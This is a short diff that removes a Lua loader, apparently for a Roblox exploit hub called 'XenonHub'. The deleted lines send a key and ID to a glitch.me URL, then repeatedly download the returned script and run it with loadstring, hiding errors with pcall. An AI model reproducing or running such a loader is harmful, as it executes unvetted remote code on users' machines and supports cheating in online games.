@@ -1,5 +1,0 @@
-pcall(function()
-   getgenv().Key = "Tum464857";
-   getgenv().Id = "822479576000888872";if syn and not(SENTINEL_V2) then r=syn.request else r=request end;
-   gets=function() return r({Method="GET",Url="https://observant-caramel-grip.glitch.me/getscript?d=Pnjv9daAWx492vJ5oRww&k="..getgenv().Key.."&id="..getgenv().Id.."&d2=XenonHub"}).Body end;rt=0;repeat spawn(function() pcall(function() loadstring(gets())() end) end);rt=rt+1;wait(60) until getgenv().executed or rt >= 10
-end)
